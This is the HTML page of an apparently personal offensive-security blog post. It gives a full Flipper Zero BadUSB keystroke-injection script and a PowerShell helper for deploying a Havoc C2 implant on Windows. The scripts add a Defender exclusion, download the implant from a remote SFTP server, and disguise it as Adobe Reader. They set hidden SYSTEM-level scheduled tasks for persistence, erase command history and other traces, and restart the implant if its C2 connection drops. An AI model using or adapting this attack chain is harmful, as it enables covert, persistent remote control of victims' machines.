@@ -1,0 +1,413 @@
+<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Deploying C2 malware pt.2 [2] - Flipper Zero BadUSB - Cibersec and hacking blog</title><meta name="description" content="Taking a step further from what we saw in the Havoc C2 post, let's take it a step further. Lets use the app BadUSB from Flipper Zero&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><script type="gdpr-blocker/">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+						new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+						j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+						'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+					})(window,document,'script','dataLayer','G-2WG99B8B6N');</script><link rel="canonical" href="https://b4shnhawx.github.io/flipper-zero-badusb.html"><link rel="alternate" type="application/atom+xml" href="https://b4shnhawx.github.io/feed.xml"><link rel="alternate" type="application/json" href="https://b4shnhawx.github.io/feed.json"><meta property="og:title" content="Deploying C2 malware pt.2 [2] - Flipper Zero BadUSB"><meta property="og:site_name" content="Cibersec and hacking blog"><meta property="og:description" content="Taking a step further from what we saw in the Havoc C2 post, let's take it a step further. Lets use the app BadUSB from Flipper Zero&hellip;"><meta property="og:url" content="https://b4shnhawx.github.io/flipper-zero-badusb.html"><meta property="og:type" content="article"><link rel="shortcut icon" href="https://b4shnhawx.github.io/media/website/logo_looka_redonded.png" type="image/x-icon"><link rel="stylesheet" href="https://b4shnhawx.github.io/assets/css/fontawesome-all.min.css?v=85514f933f9e0b82460af63f1a403fa5"><link rel="stylesheet" href="https://b4shnhawx.github.io/assets/css/style.css?v=17ff995427160411bd19d909dd194822"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://b4shnhawx.github.io/flipper-zero-badusb.html"},"headline":"Deploying C2 malware pt.2 [2] - Flipper Zero BadUSB","datePublished":"2024-12-31T20:07","dateModified":"2025-01-07T17:58","description":"Taking a step further from what we saw in the Havoc C2 post, let's take it a step further. Lets use the app BadUSB from Flipper Zero&hellip;","author":{"@type":"Person","name":"b4shnhawx","url":"https://b4shnhawx.github.io/authors/b4shnhawx/"},"publisher":{"@type":"Organization","name":"b4shnhawx"}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript></head><body class="is-preload post-template"><script>document.addEventListener("DOMContentLoaded", function() {
+    // Selecciona el contenedor donde quieres insertar el HTML
+    var sidebarInner = document.querySelector('#sidebar .inner');
+
+    // Crea el contenedor principal que contendrá el logo y el texto
+    var mainContainer = document.createElement('div');
+    mainContainer.style.position = "absolute";  // Posición absoluta para que el contenedor se ajuste correctamente
+    mainContainer.style.top = "0";  // Alinea el contenedor al borde superior del sidebar
+    mainContainer.style.left = "0";  // Alinea el contenedor al borde izquierdo del sidebar
+    mainContainer.style.width = "100%";  // Asegura que el contenedor ocupe todo el ancho del sidebar
+    mainContainer.style.height = "150px";  // Define la altura del contenedor
+    mainContainer.style.zIndex = "2";  // Asegura que el contenedor esté por encima de otros elementos
+    mainContainer.style.overflow = "hidden";  // Evita que el contenido desborde
+
+    // Crea el fondo difuminado
+    var backgroundContainer = document.createElement('div');
+    backgroundContainer.style.position = "absolute";
+    backgroundContainer.style.top = "0";
+    backgroundContainer.style.left = "0";
+    backgroundContainer.style.width = "100%";
+    backgroundContainer.style.height = "100%";
+    backgroundContainer.style.backgroundImage = "url('https://github.com/b4shnhawx/b4shnhawx.github.io/raw/main/media/files/header_bg.jpg')";
+    backgroundContainer.style.backgroundSize = "cover";  // Asegura que la imagen cubra todo el contenedor
+    backgroundContainer.style.backgroundPosition = "center";  // Centra la imagen
+    backgroundContainer.style.filter = "blur(2.5px)";  // Aplica un efecto de difuminado más ligero
+    backgroundContainer.style.zIndex = "1";  // Coloca el fondo detrás del contenido
+
+    // Crea el contenedor para el logo y el texto
+    var contentContainer = document.createElement('div');
+    contentContainer.style.display = "flex";  // Alinea los elementos horizontalmente
+    contentContainer.style.gap = "10px";  // Espacio entre los contenedores
+    contentContainer.style.width = "100%";  // Asegura que el contenedor ocupe el 100% del ancho disponible
+    contentContainer.style.height = "100%";  // Asegura que el contenedor ocupe el 100% de la altura disponible
+    contentContainer.style.zIndex = "2";  // Coloca el contenido por encima del fondo
+    contentContainer.style.position = "relative";  // Asegura que el contenido esté correctamente posicionado
+
+    // Crea el contenedor del logo
+    var logoContainer = document.createElement('div');
+    logoContainer.style.width = "150px";
+    logoContainer.style.height = "150px";
+    logoContainer.style.overflow = "hidden";  // Evita desbordamiento
+    logoContainer.style.display = "flex";  // Asegura centrado
+    logoContainer.style.alignItems = "center";
+    logoContainer.style.justifyContent = "center";
+
+    // Crea el elemento de imagen
+    var logoImg = document.createElement('img');
+    logoImg.src = "https://avatars2.githubusercontent.com/u/45437051?s=460&u=b4c1990041dd9e22c0df3f87c93b820f364c2988&v=4";
+    logoImg.alt = "Fazt Logo";
+    logoImg.classList.add('logo-sidebar');
+
+    // Añade la imagen al contenedor del logo
+    logoContainer.appendChild(logoImg);
+
+    // Crea el contenedor del texto
+    var textContainer = document.createElement('div');
+    textContainer.style.width = "150px";
+    textContainer.style.height = "150px";
+    textContainer.style.display = "flex";  // Asegura centrado vertical
+    textContainer.style.alignItems = "center";
+    textContainer.style.justifyContent = "flex-start";  // Alinea el contenido a la izquierda
+    textContainer.style.paddingLeft = "10px";  // Añade un poco de espacio desde el borde izquierdo
+
+    // Crea el elemento de texto
+    var textElement = document.createElement('div');
+    textElement.textContent = "#b4shnhawx";
+    textElement.style.fontSize = "27px";  // Aumenta el tamaño del texto
+    textElement.style.textAlign = "left";  // Justifica el texto a la izquierda
+    textElement.style.color = "#fff";  // Color blanco para que el texto sea visible
+
+    // Añade el texto al contenedor del texto
+    textContainer.appendChild(textElement);
+
+    // Añade el contenedor del logo y el contenedor del texto al contenedor de contenido
+    contentContainer.appendChild(logoContainer);
+    contentContainer.appendChild(textContainer);
+
+    // Añade el fondo difuminado al contenedor principal
+    mainContainer.appendChild(backgroundContainer);
+
+    // Añade el contenedor del contenido al contenedor principal
+    mainContainer.appendChild(contentContainer);
+
+    // Inserta el contenedor principal al inicio del contenedor de la barra lateral
+    sidebarInner.insertBefore(mainContainer, sidebarInner.firstChild);
+
+    // Crea un espaciador para evitar que el contenido de la sidebar se superponga
+    var spacer = document.createElement('div');
+    spacer.style.height = "100px";  // La misma altura que el contenedor principal
+
+    // Inserta el espaciador después del contenedor principal
+    sidebarInner.insertBefore(spacer, mainContainer.nextSibling);
+});</script><script>document.addEventListener("DOMContentLoaded", function() {
+    // Selecciona el contenedor de la barra lateral y el footer
+    var sidebarInner = document.querySelector('#sidebar .inner');
+    var footer = document.querySelector('#footer');
+
+    // Selecciona el elemento que deseas mover
+    var searchDiv = document.querySelector('#search.alt');
+
+    // Verifica que el elemento exista antes de moverlo
+    if (searchDiv) {
+        // Crea el encabezado h2 con la clase major
+        var searchHeader = document.createElement('header');
+        searchHeader.classList.add('major');
+
+        var searchTitle = document.createElement('h2');
+        searchTitle.textContent = "Search for any post...";
+        searchTitle.style.marginBottom = "15px";  // Añade espacio debajo del texto
+
+        // Añade el h2 al encabezado
+        searchHeader.appendChild(searchTitle);
+
+        // Mueve el elemento de búsqueda justo antes del footer
+        sidebarInner.insertBefore(searchDiv, footer);
+
+        // Inserta el encabezado justo antes del cuadro de búsqueda
+        sidebarInner.insertBefore(searchHeader, searchDiv);
+    }
+});</script><script>document.addEventListener("DOMContentLoaded", function() {
+    // Selecciona el primer elemento con la clase "post__tag"
+    var firstTagElement = document.querySelector("div.post__tag");
+
+    // Comprueba si el elemento existe
+    if (firstTagElement) {
+        // Crea un nuevo div con la clase "post__tag"
+        var warningBox = document.createElement("div");
+        warningBox.className = "post__tag";
+        warningBox.style.fontSize = "small"; // Haz el texto más pequeño
+
+        // Añade el contenido del texto con un salto de línea al principio y al final
+        warningBox.innerHTML = "All content published in this post is for educational purposes only and has been tested in controlled and managed environments by me.";
+
+        // Inserta el nuevo div justo después del primer div.post__tag
+        firstTagElement.insertAdjacentElement('afterend', warningBox);
+    }
+});</script><div id="wrapper"><div id="main"><div class="inner"><header id="header"><a class="logo" href="https://b4shnhawx.github.io/"><strong>Cibersec and hacking blog</strong></a><ul class="icons"><li><a href="https://x.com/_Myrtivheal" class="icon brands fa-x-twitter"><span class="label">Twitter</span></a></li><li><a href="https://www.linkedin.com/in/darribash/" class="icon brands fa-linkedin"><span class="label">LinkedIn</span></a></li><li><a href="https://www.youtube.com/channel/UCxvS-XzNNYFOq45-ScuLrxA" class="icon brands fa-youtube"><span class="label">YouTube</span></a></li></ul></header><article class="post"><header class="main post__header"><time datetime="2024-12-31T20:07" class="post__date">December 31, 2024</time><h1>Deploying C2 malware pt.2 [2] - Flipper Zero BadUSB</h1></header><div class="post__inner post__entry"><p>Taking a step further from what we saw in the <a href="https://b4shnhawx.github.io/creating-c2-with-havoc-in-kali-linux.html">Havoc C2 post</a>, let's take it a step further. </p><p>Lets use the app BadUSB from Flipper Zero to inject malicious code in Windows 10/11 (also you can use Rubber Ducky). <br><br>In the lab we will:</p><ul><li>Avoid the detection in Windows Defender [<span style="color: #b96ad9;">EVASION </span>: <span style="color: #e03e2d;">T1564.012</span>].</li><li>Download the payload from the Havoc server [<span style="color: #b96ad9;">OBTAIN CAPABILITIES</span> : <span style="color: #e03e2d;">T1588.001</span>].</li><li>Create a task to execute it every boot and logon [<span style="color: #b96ad9;">PERSISTENCE</span> : <span style="color: #e03e2d;">T1053.005</span>].</li><li>OPTIONAL - Deploy a script that checks if the demon.exe its currently running to avoid duplicate processes and difficult the detection [<span style="color: #b96ad9;">EVASION</span>].<br><br></li></ul><h3><strong>HOW IT WORKS?</strong></h3><hr class="line"><p>Simply put, each device has a HID (Human Interface Device) that identifies which device it is. <br><br>Rubber Ducky (and Flipper Zero's BadUSB) shows the computer that its HID corresponds to a keyboard or mouse, allowing it to <em>"typing"</em> from a preloaded script.</p><h3>CREATION OF THE BADUSB / RUBBER DUCKY SCRIPT</h3><hr class="line"><ol><li>aaaaaa<br><pre class="language-bash"><code>REM --&gt; Prepare terminal
+DELAY 1000
+REM --&gt; GUI d
+DELAY 150
+GUI r
+DELAY 400
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+ALT s
+DELAY 2000
+CTRL c
+DELAY 500
+STRING color FE &amp; mode con:cols=15 lines=1
+ENTER
+STRING powershell
+ENTER
+DELAY 50
+STRING cd "$env:USERPROFILE\"
+ENTER
+DELAY 50</code></pre></li><li>aaaaaa<br><pre class="language-bash"><code>REM --&gt; Exception
+STRING New-Item -ItemType Directory -Path "$env:UserProfile\AppData\Local\.adobe_reader" -Force &gt; $null 2&gt;&amp;1
+ENTER
+DELAY 50
+STRING Add-MpPreference -ExclusionPath "$env:UserProfile\AppData\Local\.adobe_reader\demon.x64.exe"
+ENTER
+DELAY 50</code></pre></li><li>aaaaaa<br><pre class="language-bash"><code>REM --&gt; Transfer C2 exe SSH
+STRING (Get-Content ".\.ssh\known_hosts") | Where-Object { $_ -notmatch "172\.233\.32\.196" } | Set-Content ".\.ssh\known_hosts"
+ENTER
+DELAY 100
+STRING copy .\.ssh\known_hosts .\.ssh\known_hosts_bckp
+ENTER
+DELAY 100
+STRING sftp &lt;SFTP USER&gt;@&lt;SFTP SERVER IP&gt;
+ENTER
+DELAY 500
+STRING yes
+ENTER
+DELAY 500
+STRING &lt;SFTP PASSWORD&gt;
+ENTER
+DELAY 500
+STRING cd ../download
+ENTER
+DELAY 100
+STRING lcd AppData\Local\.adobe_reader
+ENTER
+DELAY 100
+STRING get demon.x64.exe
+ENTER
+DELAY 2000
+STRING get Adobe_Reader_Init.ps1
+ENTER
+DELAY 2000
+STRING bye
+ENTER
+DELAY 100</code></pre></li><li>aaaaaa<br><pre class="language-bash"><code>REM --&gt; Persistence
+STRING $scheduleObject = New-Object -ComObject schedule.service; $scheduleObject.connect(); $rootFolder = $scheduleObject.GetFolder("\Microsoft"); $rootFolder.CreateFolder("Adobe")
+ENTER
+DELAY 100
+STRING schtasks /create /sc onstart /tn "Microsoft\Adobe\AdobeServiceBoot" /tr "cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\AppData\Local\.adobe_reader\Adobe_Reader_Init.ps1’”" /rl highest
+ENTER
+DELAY 50
+STRING schtasks /create /sc onevent /mo "*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4648]]" /ec Security /tn "Microsoft\Adobe\AdobeServiceLogon" /tr "cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\AppData\Local\.adobe_reader\Adobe_Reader_Init.ps1’”" /rl highest
+ENTER
+DELAY 100
+STRING schtasks /run /tn "Microsoft\Adobe\AdobeServiceLogon"
+ENTER
+DELAY 100</code></pre></li><li>aaaaaa<br><pre class="language-bash"><code>REM --&gt; Clean up
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+DELAY 10
+STRING copy .\.ssh\known_hosts_bckp .\.ssh\known_hosts
+ENTER
+DELAY 100
+STRING del .\.ssh\known_hosts_bckp
+ENTER
+DELAY 10
+STRING del AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+ENTER
+DELAY 10
+STRING exit
+ENTER
+DELAY 10
+STRING exit
+ENTER
+DELAY 10</code></pre></li></ol><h3> </h3><h3>OPTIONAL - CREATION OF THE POWERSHELL SCRIPT</h3><hr class="line"><p>Simply put, each device</p><ol><li>aaaaaaaa<br><pre class="language-bash"><code>$processName = "demon.x64.exe"
+$executablePath = "$env:USERPROFILE\AppData\Local\.adobe_reader\demon.x64.exe"
+$serverIP = "&lt;HAVOC SERVER IP&gt;"</code></pre></li><li>aaaaaaaa<br><pre class="language-bash"><code>$processesWithConnections = Get-NetTCPConnection |
+    Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq "443" -and $_.State -eq "Established" } |
+    Select-Object -Property OwningProcess
+
+$connectedProcessIds = $processesWithConnections | ForEach-Object { $_.OwningProcess }</code></pre></li><li>aaaaaaaa<br><pre class="language-bash"><code>Get-Process -Name ($processName -replace ".exe", "") -ErrorAction SilentlyContinue |
+    Where-Object { $connectedProcessIds -notcontains $_.Id } |
+    ForEach-Object {
+        Write-Output "Terminate process $($processName) with ID $($_.Id) without connection."
+        Stop-Process -Id $_.Id -Force
+    }</code></pre></li><li>aaaaaaaa<br><pre class="language-bash"><code>Get-Process -Name ($processName -replace ".exe", "") -ErrorAction SilentlyContinue ; Get-NetTCPConnection | Select-Object -Property OwningProcess, LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Sort-Object -Property OwningProcess | Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq "443" }</code></pre></li><li>aaaaaaaa<br><pre class="language-bash"><code>if (-not $connectedProcessIds) {
+    Write-Output "There are no processes with active connection. Executing $executablePath..."
+    Start-Process -FilePath $executablePath -NoNewWindow
+} else {
+    Write-Output "There is already a process with an active connection. No action is taken."
+}
+</code></pre></li></ol><h3><strong>FULL BADUSB / RUBBER DUCKY SCRIPT</strong></h3><hr class="line"><pre class="language-bash"><code>REM --&gt; Prepare terminal
+DELAY 1000
+REM --&gt; GUI d
+DELAY 150
+GUI r
+DELAY 400
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+ALT s
+DELAY 2000
+CTRL c
+DELAY 500
+STRING color FE &amp; mode con:cols=15 lines=1
+ENTER
+STRING powershell
+ENTER
+DELAY 50
+STRING cd "$env:USERPROFILE\"
+ENTER
+DELAY 50
+REM --&gt; Exception
+STRING New-Item -ItemType Directory -Path "$env:UserProfile\AppData\Local\.adobe_reader" -Force &gt; $null 2&gt;&amp;1
+ENTER
+DELAY 50
+STRING Add-MpPreference -ExclusionPath "$env:UserProfile\AppData\Local\.adobe_reader\demon.x64.exe"
+ENTER
+DELAY 50
+REM --&gt; Transfer C2 exe SSH
+STRING (Get-Content ".\.ssh\known_hosts") | Where-Object { $_ -notmatch "172\.233\.32\.196" } | Set-Content ".\.ssh\known_hosts"
+ENTER
+DELAY 100
+STRING copy .\.ssh\known_hosts .\.ssh\known_hosts_bckp
+ENTER
+DELAY 100
+STRING sftp &lt;SFTP USER&gt;@&lt;SFTP SERVER IP&gt;
+ENTER
+DELAY 500
+STRING yes
+ENTER
+DELAY 500
+STRING &lt;SFTP PASSWORD&gt;
+ENTER
+DELAY 500
+STRING cd ../download
+ENTER
+DELAY 100
+STRING lcd AppData\Local\.adobe_reader
+ENTER
+DELAY 100
+STRING get demon.x64.exe
+ENTER
+DELAY 2000
+STRING get Adobe_Reader_Init.ps1
+ENTER
+DELAY 2000
+STRING bye
+ENTER
+DELAY 100
+REM --&gt; Persistence
+STRING $scheduleObject = New-Object -ComObject schedule.service; $scheduleObject.connect(); $rootFolder = $scheduleObject.GetFolder("\Microsoft"); $rootFolder.CreateFolder("Adobe")
+ENTER
+DELAY 100
+STRING schtasks /create /sc onstart /tn "Microsoft\Adobe\AdobeServiceBoot" /tr "cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\AppData\Local\.adobe_reader\Adobe_Reader_Init.ps1’”" /rl highest
+ENTER
+DELAY 50
+STRING schtasks /create /sc onevent /mo "*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4648]]" /ec Security /tn "Microsoft\Adobe\AdobeServiceLogon" /tr "cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\AppData\Local\.adobe_reader\Adobe_Reader_Init.ps1’”" /rl highest
+ENTER
+DELAY 100
+STRING schtasks /run /tn "Microsoft\Adobe\AdobeServiceLogon"
+ENTER
+DELAY 100
+REM --&gt; Clean up
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+DELAY 10
+STRING copy .\.ssh\known_hosts_bckp .\.ssh\known_hosts
+ENTER
+DELAY 100
+STRING del .\.ssh\known_hosts_bckp
+ENTER
+DELAY 10
+STRING del AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+ENTER
+DELAY 10
+STRING exit
+ENTER
+DELAY 10
+STRING exit
+ENTER
+DELAY 10</code></pre><p> </p><h3><strong>OPTIONAL - FULL POWERSHELL SCRIPT</strong></h3><hr class="line"><pre class="language-visual-basic"><code>$processName = "demon.x64.exe"
+$executablePath = "$env:USERPROFILE\AppData\Local\.adobe_reader\demon.x64.exe"
+$serverIP = "&lt;HAVOC SERVER IP&gt;"
+
+$processesWithConnections = Get-NetTCPConnection |
+    Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq "443" -and $_.State -eq "Established" } |
+    Select-Object -Property OwningProcess
+
+$connectedProcessIds = $processesWithConnections | ForEach-Object { $_.OwningProcess }
+
+Get-Process -Name ($processName -replace ".exe", "") -ErrorAction SilentlyContinue |
+    Where-Object { $connectedProcessIds -notcontains $_.Id } |
+    ForEach-Object {
+        Write-Output "Terminate process $($processName) with ID $($_.Id) without connection."
+        Stop-Process -Id $_.Id -Force
+    }
+
+Get-Process -Name ($processName -replace ".exe", "") -ErrorAction SilentlyContinue ; Get-NetTCPConnection | Select-Object -Property OwningProcess, LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Sort-Object -Property OwningProcess | Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq "443" }
+
+if (-not $connectedProcessIds) {
+    Write-Output "There are no processes with active connection. Executing $executablePath..."
+    Start-Process -FilePath $executablePath -NoNewWindow
+} else {
+    Write-Output "There is already a process with an active connection. No action is taken."
+}
+</code></pre><p> </p></div><footer class="post__inner post__footer"><p class="post__last-updated">This article was updated on January 7, 2025</p><div class="post__share"><h3>Share post:</h3><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fb4shnhawx.github.io%2Fflipper-zero-badusb.html&amp;via=%40_Myrtivheal&amp;text=Deploying%20C2%20malware%20pt.2%20%5B2%5D%20-%20Flipper%20Zero%20BadUSB" class="js-share icon brands fa-x-twitter" rel="nofollow noopener noreferrer"><span class="label">Twitter</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fb4shnhawx.github.io%2Fflipper-zero-badusb.html" class="js-share icon brands fa-linkedin" rel="nofollow noopener noreferrer"><span class="label">LinkedIn</span> </a><a href="https://api.whatsapp.com/send?text=Deploying%20C2%20malware%20pt.2%20%5B2%5D%20-%20Flipper%20Zero%20BadUSB https%3A%2F%2Fb4shnhawx.github.io%2Fflipper-zero-badusb.html" class="js-share icon brands fa-whatsapp" rel="nofollow noopener noreferrer"><span class="label">WhatsApp</span></a></div><div class="post__tag"><ul><li><strong>Tagged in:</strong></li><li><a href="https://b4shnhawx.github.io/tags/flipperzero/">flipperzero</a></li><li><a href="https://b4shnhawx.github.io/tags/hacking/">hacking</a></li><li><a href="https://b4shnhawx.github.io/tags/offensive/">offensive</a></li><li><a href="https://b4shnhawx.github.io/tags/os/">os</a></li><li><a href="https://b4shnhawx.github.io/tags/powershell/">powershell</a></li><li><a href="https://b4shnhawx.github.io/tags/windows/">windows</a></li></ul></div></footer></article><div class="comments-area"><div class="post__inner"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="graphcomment"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var __semio__params = {
+							graphcommentId: "",
+							behaviour: {
+								uid: "17"
+							}
+						}
+
+						function __semio__onload() {
+							__semio__gc_graphlogin(__semio__params)
+						}
+						
+						
+			(function() {
+				var gc = document.createElement('script'); gc.type = 'text/javascript'; gc.async = true;
+				gc.onload = __semio__onload; gc.defer = true; gc.src = 'https://integration.graphcomment.com/gc_graphlogin.js?' + Date.now();
+				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(gc);
+			})();</script><script type="text/javascript"></script></div></div></div></div><div class="banner banner--after-post"><div class="wrapper"><div id="graphcomment"></div><script type="text/javascript">/* - - - CONFIGURATION VARIABLES - - - */
+
+  var __semio__params = {
+    graphcommentId: "b4shnhawx-github-io", // make sure the id is yours
+
+    behaviour: {
+      // HIGHLY RECOMMENDED
+      //  uid: "...", // uniq identifer for the comments thread on your page (ex: your page id)
+    },
+
+    // configure your variables here
+    "sidePanel": {
+      "width": 480,
+      "button": {
+        "background": "#313841",
+        "color": "#e0e0e0",
+    	"width": 1000,
+        "label": "Leave a comment"
+      },
+      "visible": false
+    }
+  }
+
+  /* - - - DON'T EDIT BELOW THIS LINE - - - */
+
+  function __semio__onload() {
+    __semio__gc_sidePanel_graphlogin(__semio__params)
+  }
+
+
+  (function() {
+    var gc = document.createElement('script'); gc.type = 'text/javascript'; gc.async = true;
+    gc.onload = __semio__onload; gc.defer = true; gc.src = 'https://integration.graphcomment.com/gc_sidePanel_graphlogin.js?' + Date.now();
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(gc);
+  })();</script></div></div></div></div><div id="sidebar"><div class="inner"><div id="search" class="alt"><form action="https://b4shnhawx.github.io/search.html" class="search__form"><input class="search__input" type="search" name="q" placeholder="search..." aria-label="search..." autofocus required> <button type="submit" class="search__button"><span>Submit</span></button></form></div><nav id="menu"><header class="major"><h2>Menu</h2></header><ul><li><a href="https://b4shnhawx.github.io/" target="_self">HOME</a></li><li><a href="https://b4shnhawx.github.io/authors/b4shnhawx/" target="_self">ABOUT ME</a></li><li class="has-submenu"><a href="https://b4shnhawx.github.io/tags/" target="_self" aria-haspopup="true" class="opener">CATEGORIES</a><ul class="submenu level-2" aria-hidden="true"><li><a href="https://b4shnhawx.github.io/tags/offensive/" target="_self">HACKING OFFENSIVE</a></li><li><a href="https://b4shnhawx.github.io/tags/deffensive/" target="_self">HACKING DEFFENSIVE</a></li><li><a href="https://b4shnhawx.github.io/tags/flipperzero/" target="_self">FLIPPER ZERO</a></li><li><a href="https://b4shnhawx.github.io/tags/programming/" target="_self">PROGRAMMING</a></li><li><a href="https://b4shnhawx.github.io/tags/linux/" target="_self">LINUX</a></li><li><a href="https://b4shnhawx.github.io/tags/windows/" target="_self">WINDOWS</a></li><li><a href="https://b4shnhawx.github.io/tags/networking/" target="_self">NETWORKING</a></li><li><a href="https://b4shnhawx.github.io/tags/cheatsheets/" target="_self">CHEATSHEETS</a></li><li><a href="https://b4shnhawx.github.io/tags/personal/" target="_self">PERSONAL</a></li><li><a href="https://b4shnhawx.github.io/tags/raspberrypi/" target="_self">RASPBERRY PI</a></li></ul></li><li><a href="https://b4shnhawx.github.io/tags/" target="_self">PROJECTS</a></li></ul></nav><section><header class="major"><h2>Get in touch</h2></header><p class="align-center">--== My area of expertise ==--</p><p class="align-center"> </p><p class="align-center">🛡 Deffensive Cibersecurity 🛡</p><p class="align-center">♦️       Incident Response      ♦️<br>♦️         Threat Hunting         ♦️<br>♦️   Python and Powershell   ♦️<br>♦️          Bash and Linux         ♦️</p><p> </p><p>Contact me for any issues :D</p><p><a href="mailto:davidarribash@gmail.com">davidarribash[@]gmail[.]com</a></p></section><footer id="footer"><p class="copyright">© b4shnhawx 2024 - All rights reserved</p></footer></div></div></div><script src="https://b4shnhawx.github.io/assets/js/jquery.min.js?v=7c14a783dfeb3d238ccd3edd840d82ee"></script><script src="https://b4shnhawx.github.io/assets/js/browser.min.js?v=c07298dd19048a8a69ad97e754dfe8d0"></script><script src="https://b4shnhawx.github.io/assets/js/breakpoints.min.js?v=81a479eb099e3b187613943b085923b8"></script><script src="https://b4shnhawx.github.io/assets/js/util.min.js?v=cbdaf7c20ac2883c77ae23acfbabd47e"></script><script src="https://b4shnhawx.github.io/assets/js/main.min.js?v=08add7f6d435054ad38ec38d7cf8be40"></script><script>var images=document.querySelectorAll("img[loading]");for(var i=0;i<images.length;i++){if(images[i].complete){images[i].classList.add("is-loaded")}else{images[i].addEventListener("load",function(){this.classList.add("is-loaded")},false)}};</script></body></html>
